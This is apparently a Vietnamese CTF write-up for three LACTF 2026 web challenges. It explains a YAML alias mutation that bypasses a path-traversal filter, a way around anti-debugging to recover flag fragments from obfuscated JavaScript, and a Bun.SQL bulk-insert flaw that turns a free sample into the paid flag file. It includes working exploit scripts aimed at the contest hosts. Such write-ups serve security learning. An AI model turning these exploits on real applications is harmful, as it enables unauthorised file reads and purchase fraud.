---
title: LACTF 2026
date: 2026-02-14 09:00:00 +0700
categories: [Security, CTF]
tags: [writeup, web-security]
image:
  path: /assets/img/LACTF2026/logo.gif
---

## **Web**

### **blogler**  

- Mô tả: They call me the blogler.  
- Attachment: folder .zip  
- Cách giải:    

#### 1. Phân tích mã nguồn

Ứng dụng được viết bằng **Flask**, cho phép người dùng đăng ký, đăng nhập, viết blog bằng Markdown và cập nhật cấu hình cá nhân thông qua định dạng **YAML**.

##### Chức năng cập nhật cấu hình (`/config`)

Điểm yếu cốt lõi nằm ở hàm `validate_conf` và cách ứng dụng xử lý dữ liệu YAML:

```python
def validate_conf(old_cfg: dict, uploaded_conf: str) -> dict | str:
    try:
        conf = yaml.safe_load(uploaded_conf) #

        # 1. Kiểm tra LFI cho từng blog
        for i, blog in enumerate(conf["blogs"]):
            file_name = blog["name"]
            file_path = (blog_path / file_name).resolve()
            # Bộ lọc ngăn chặn "../" và kiểm tra tính tương đối
            if "../" in file_name or file_name.startswith("/") or not file_path.is_relative_to(blog_path): #
                return f"file path {file_name!r} is a hacking attempt..."

        # 2. Sau khi kiểm tra, cập nhật tên hiển thị của user
        conf["user"]["name"] = display_name(conf["user"].get("name", old_cfg["user"]["name"])) #
        return conf
```

##### Hàm biến đổi tên (`display_name`)

Hàm này thực hiện chia chuỗi dựa trên dấu gạch dưới (`_`), viết hoa chữ cái đầu của mỗi phần rồi nối lại:

```python
def display_name(username: str) -> str:
    return "".join(p.capitalize() for p in username.split("_"))
```

#### 2. Các lỗ hổng phát hiện

##### Lỗ hổng 1: YAML Anchor & Alias

Thư viện `yaml.safe_load` hỗ trợ tính năng **Anchors (`&`)** và **Aliases (`*`)**. Nếu chúng ta tạo một alias từ một blog entry vào trường `user`, thì cả hai sẽ cùng trỏ đến **một đối tượng dictionary duy nhất** trong bộ nhớ.

##### Lỗ hổng 2: Mutation sau khi Validation

Trong `validate_conf`, danh sách `blogs` được kiểm tra an toàn **trước**, sau đó trường `user["name"]` mới được cập nhật. Nếu `user` và `blog` là cùng một đối tượng, việc cập nhật `user["name"]` sẽ trực tiếp thay đổi giá trị `name` của blog đó **sau khi nó đã vượt qua bước kiểm tra an toàn**.

##### Lỗ hổng 3: Bypass Path Traversal Filter

Hàm `display_name` vô tình biến một chuỗi "vô hại" (không chứa `../`) thành một chuỗi "độc hại" (có chứa `../`).

* **Payload:** `.._/_.._/_.._/_./flag`
* **Xử lý:** `split("_")` tạo ra `['..', '/', '..', '/', '..', '/', './flag']`.
* **Capitalize & Join:** Trở thành `../../../.././flag`.

#### 3. Chiến thuật khai thác

1. **Đăng ký/Đăng nhập:** Để lấy session hợp lệ.
2. **Gửi Payload YAML:** Sử dụng Anchor để đồng bộ hóa đối tượng blog và đối tượng user. Trường `name` của blog ban đầu để là `.._/_.._/_.._/_./flag` để lừa hàm kiểm tra `if "../" in file_name`.
3. **Kích hoạt Mutation:** Khi server gọi `display_name(conf["user"].get("name", ...))`, giá trị `name` (vốn là `.._/_.._/_.._/_./flag`) sẽ bị biến đổi thành `../../../.././flag`. Do tính chất tham chiếu, thuộc tính `name` của blog đầu tiên trong danh sách cũng bị đổi theo.
4. **Đọc Flag:** Truy cập `/blog/<username>`. Lúc này, server sẽ thực hiện `(blog_path / blog["name"]).read_text()`, thực tế là đọc file `/flag` ở ngoài thư mục root.

#### 4. Payload hoàn chỉnh

```yaml
blogs:
  - &exploit
    title: "My Exploit"
    name: ".._/_.._/_.._/_./flag"
user: *exploit
```

#### Exploit code

```python  
import requests
import re

BASE_URL = "https://blogler.chall.lac.tf" 

def solve():
    session = requests.Session()
    username = "exploiter_check_content"
    password = "password123"

    print(f"[*] Đăng ký: {username}")
    session.post(f"{BASE_URL}/register", data={"username": username, "password": password})

    # Payload đã xác nhận hoạt động (trả về 200)
    path = ".._/_.._/_.._/_./flag"
    
    yaml_payload = f"""
blogs:
  - &pwn
    title: "Exploit"
    name: "{path}"
user: *pwn
"""
    print(f"[*] Gửi payload: {path}")
    session.post(f"{BASE_URL}/config", data={"config": yaml_payload})
    
    # Truy cập trang blog
    blog_page = session.get(f"{BASE_URL}/blog/{username}")
    
    if blog_page.status_code == 200:
        print("[+] Đã đọc file thành công!")
        
        # Thử tìm với định dạng lactf{...}
        flag = re.findall(r"lactf\{.*?\}", blog_page.text)
        
        if flag:
            print(f"\n[!] FLAG TÌM THẤY: {flag[0]}")
        else:
            print("[-] Không tìm thấy chuỗi định dạng 'lactf{...}'.")
            print("[*] Nội dung thô của trang (kiểm tra phần nội dung blog):")
            print("-" * 50)
            # In ra nội dung để bạn tự kiểm tra bằng mắt
            print(blog_page.text) 
            print("-" * 50)
    else:
        print(f"[!] Lỗi server: {blog_page.status_code}")

if __name__ == "__main__":
    solve()
```  

> Flag: `lactf{7m_g0nn4_bl0g_y0u}`
{: .prompt-flag }

### **mutation mutation**

- Mô tả:  

It's a free flag! You just gotta inspect the page to get it. Just be quick though... the flag is constantly mutating. Can you catch it before it changes? 🧬  

- Attachment:    
- Cách giải:   

#### 1. Phân tích kỹ thuật

##### a. Lớp bảo vệ chống Debug (Anti-Debugging)

Trang web sử dụng các kỹ thuật sau để ngăn cản người chơi:

* **Event Listeners:** Chặn `contextmenu` (chuột phải) và `keydown` (các phím tắt Inspect).
* **Kích thước cửa sổ:** Sử dụng `window.outerWidth` và `window.innerHeight` để phát hiện nếu Console đang mở và thực hiện hành động xóa hoặc ghi đè dữ liệu.
* **HoneyPot:** Liên tục tạo ra các `Comment Node` rác trong DOM để làm rối người chơi nếu họ xem được Element tree.

##### b. Mã rối (Obfuscation)

Mã nguồn được xử lý qua **JavaScript Obfuscator** với các đặc điểm:

* **String Array:** Toàn bộ chuỗi (bao gồm các mảnh của flag) được lưu trong một mảng lớn.
* **Array Shuffling:** Một hàm tự thực thi (IIFE) sẽ xoay mảng này theo một thuật toán cố định ngay khi tải trang.
* **Hex Offsets:** Truy xuất chuỗi qua các giá trị Hex để gây khó khăn cho việc đọc hiểu thủ công.

#### 2. Giải quyết vấn đề

##### Bước 1: Vượt qua rào cản Inspect

Thay vì tìm cách mở F12 trên trang bị chặn, ta có thể:  
* Mở DevTools ở một tab trống rồi mới truy cập link.
* Sử dụng trình duyệt không hỗ trợ các script chặn (như trình duyệt văn bản) hoặc dùng Proxy (Burp Suite) để loại bỏ các dòng code `preventDefault()`.

##### Bước 2: Trích xuất các mảnh Flag (Deobfuscation)

Sau khi truy cập được Console, ta nhận thấy hàm `_0x562a` (tên hàm có thể thay đổi tùy phiên bản) chứa mảng các chuỗi thô. Thay vì giải mã ngược thuật toán, ta có thể sử dụng sức mạnh của chính trình duyệt để lọc dữ liệu.

**Exploit code:**

```javascript
(function() {
  const parts = _0x562a().filter(s => s.includes('lactf') 
                                || s.includes('mut') 
                                || s.includes('fun') 
                                || s === '}');

  const correctOrder = [parts.find(p => p.startsWith('lactf{')),
                        parts.find(p => p.includes('mutаt')),
                        parts.find(p => p.includes('fun')),
                        '}'];
  console.log("Flag của bạn đây:");
  console.log(correctOrder.join(''));
})();
```

> Flag: `lactf{с0nѕtаnt_mutаtі0n_1s_fun!_🧬_👋🏽_ІlІ1| ض픋ԡೇ∑ᦞ୞땾᥉༂↗ۑீ᤼യ⌃±❣Ӣ◼ௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌ}lactf{с0nѕtаnt_mutаtі0n_1s_fun!_🧬_👋🏽_ІlІ1| ض픋ԡೇ∑ᦞ୞땾᥉༂↗ۑீ᤼യ⌃±❣Ӣ◼ௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌ}lactf{с0nѕtаnt_mutаtі0n_1s_fun!_🧬_👋🏽_ІlІ1| ض픋ԡೇ∑ᦞ୞땾᥉༂↗ۑீ᤼യ⌃±❣Ӣ◼ௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌ}}`
{: .prompt-flag }

### **narnes-and-bobles**

- Mô tả:  

I heard Amazon killed a certain book store so I'm gonna make my own book store and kill Amazon. I dove deep and delivered results.

- Attachment: folder .zip    
- Cách giải:   

#### 1. Phân tích mã nguồn (Source Code Analysis)

Khi xem file `server.js`, luồng mua hàng diễn ra qua 2 bước chính: Thêm vào giỏ hàng (`/cart/add`) và Thanh toán (`/cart/checkout`).

##### A. Endpoint `/cart/add`

Khi thêm một mảng các sản phẩm vào giỏ hàng, server thực hiện tính toán xem chúng ta có đủ tiền không:

```javascript
  const additionalSum = productsToAdd
    .filter((product) => !+product.is_sample)
    .map((product) => booksLookup.get(product.book_id).price ?? 99999999)
    .reduce((l, r) => l + r, 0);

  if (additionalSum + cartSum > balance) {
    return res.json({ err: 'too poor, have you considered geting more money?' })
  }

```

* **Lưu ý:** Nếu thuộc tính `is_sample` mang giá trị truthy (ví dụ: `1`), JS sẽ đánh giá là hàng mẫu và không cộng tiền cuốn sách đó vào tổng hóa đơn (`additionalSum`).

Ngay sau khi kiểm tra số dư thành công, server đưa dữ liệu vào Database:

```javascript
  const cartEntries = productsToAdd.map((prod) => ({ ...prod, username: res.locals.username }));
  await db`INSERT INTO cart_items ${db(cartEntries)}`;

```

##### B. Endpoint `/cart/checkout`

Khi thanh toán, server lấy danh sách từ Database, trừ tiền (nhưng **không kiểm tra** xem số dư có bị âm hay không), và quyết định gửi file thật hay file mẫu dựa trên cột `is_sample` trong DB:

```javascript
  await Promise.all(cart.map(async (item) => {
    const book = booksLookup.get(item.book_id);
    const path = item.is_sample ? book.file.replace(/\.([^.]+)$/, '_sample.$1') : book.file;
    // ...

```

#### 2. Lỗ hổng (The Vulnerability)

Lỗ hổng xảy ra tại dòng lệnh `await db`INSERT INTO cart_items ${db(cartEntries)}``; của `Bun.SQL`.

Khi thực hiện Bulk Insert bằng cách truyền vào một mảng các object, `Bun.SQL` sẽ **chỉ nhìn vào object ĐẦU TIÊN** trong mảng để xác định các cột (columns) cần chèn vào Database.

Nếu chúng ta gửi một mảng `products` gồm 2 object:

1. `{"book_id": "sach_thuong"}` *(Không có key `is_sample`)*
2. `{"book_id": "flag", "is_sample": 1}`

**Luồng thực thi sẽ diễn ra như sau:**

1. **Tại JS Check:** Sách thường tính giá 10$. Sách Flag có `is_sample: 1` nên tính giá 0$. Tổng hóa đơn là 10$. Chúng ta có 1000$ -> Vượt qua bước kiểm tra số dư trót lọt!
2. **Tại SQL Insert:** `Bun.SQL` lấy object đầu tiên làm mẫu. Nó thấy object đầu tiên chỉ có cột `book_id` và `username`. Do đó, nó sẽ tạo câu lệnh SQL `INSERT INTO cart_items (book_id, username) VALUES (...)` và **lờ đi hoàn toàn** thuộc tính `is_sample` của object thứ 2.
3. **Kết quả trong DB:** Sách Flag được chèn vào DB với cột `is_sample` mang giá trị mặc định là `NULL`.
4. **Khi Checkout:** Hệ thống đọc DB, thấy `is_sample` của Flag là `NULL` (falsy value). Nó sẽ hiểu đây là sách thật và đóng gói file `flag.txt` gửi về cho chúng ta!

#### 3. Khai thác (Exploitation)

Dưới đây là script Python hoàn chỉnh để tự động hóa quá trình tạo tài khoản, gửi payload độc hại và tải file zip chứa flag.

```python
import requests
import re

BASE_URL = "https://narnes-and-bobles-w3knk.instancer.lac.tf/" # Thay đổi URL theo bài thi của bạn
S = requests.Session()

# 1. Đăng ký tài khoản
username = "hacker123"
password = "password"
print(f"[*] Registering user: {username}")
S.post(f"{BASE_URL}/register", data={"username": username, "password": password})

# 2. Khai thác logic /cart/add
# Book ID rẻ: a3e33c2505a19d18 (10$)
# Flag ID: 2a16e349fb9045fa (1,000,000$)
payload = {
    "products": [
        {"book_id": "a3e33c2505a19d18"},           # Bait item (defines columns)
        {"book_id": "2a16e349fb9045fa", "is_sample": 1} # Flag item (is_sample dropped in DB)
    ]
}

print("[*] Sending malicious payload to /cart/add...")
r = S.post(f"{BASE_URL}/cart/add", json=payload)
print(f"Response: {r.text}")

# 3. Checkout và lấy flag
print("[*] Checking out...")
r = S.post(f"{BASE_URL}/cart/checkout")

if r.status_code == 200:
    with open("loot.zip", "wb") as f:
        f.write(r.content)
    print("[+] Downloaded loot.zip! Extract it to find the flag.")
else:
    print("[-] Checkout failed.")
```

Giải nén file `loot.zip` tải về, chúng ta nhận được `flag.txt`

> Flag: `lactf{matcha_dubai_chocolate_labubu}`
{: .prompt-flag }

